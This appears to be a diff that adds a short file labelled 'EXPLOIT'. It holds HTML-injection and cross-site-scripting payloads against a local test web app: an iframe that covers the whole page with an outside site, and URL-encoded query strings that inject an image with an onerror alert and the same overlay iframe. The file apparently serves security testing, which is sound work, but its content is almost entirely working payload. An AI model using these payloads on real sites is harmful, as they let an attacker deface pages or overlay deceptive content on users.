@@ -1,0 +1,7 @@
+﻿EXPLOIT
+<h1>Testing
+
+<iframe src="//flowertwig.org/cv/" style="z-index:2000;position:fixed;top:0;left:0;width:100%;height:100%;border:0" scrolling="no">
+http://localhost:59598/?query=%3Cimg%20src=%22http://flowertwig.org/test/%22%20onerror=%22alert(1)%22%20/%3E
+
+http://localhost:59598/Home/Index?query=%3Ciframe%20src=%22//flowertwig.org/cv/%22%20/%20style=%22z-index:2000;position:fixed;top:0;left:0;width:100%;height:100%;border:0%22%20scrolling=%22no%22%3E
